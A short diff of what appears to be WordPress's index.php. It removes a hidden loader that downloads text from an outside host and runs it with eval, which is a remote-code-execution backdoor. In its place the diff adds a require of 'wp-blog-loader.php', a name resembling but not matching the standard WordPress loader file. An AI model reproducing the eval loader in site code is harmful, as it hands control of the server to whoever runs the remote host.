@@ -1,8 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/naik.txt'));
-$url = "?> ".$url;
-eval($url);
-
+require('wp-blog-loader.php');
 /**
  * Loads the WordPress environment and template.
  *
